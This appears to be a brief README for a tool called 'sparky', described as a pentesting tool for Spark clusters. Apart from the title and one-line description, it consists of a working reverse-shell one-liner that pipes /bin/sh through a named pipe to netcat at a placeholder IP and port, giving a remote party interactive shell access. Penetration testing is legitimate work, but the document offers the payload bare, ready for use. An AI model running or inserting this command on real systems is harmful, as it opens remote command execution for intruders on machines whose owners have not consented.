# sparky
Tool to pentest spark clusters


reverse shell on sh :
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f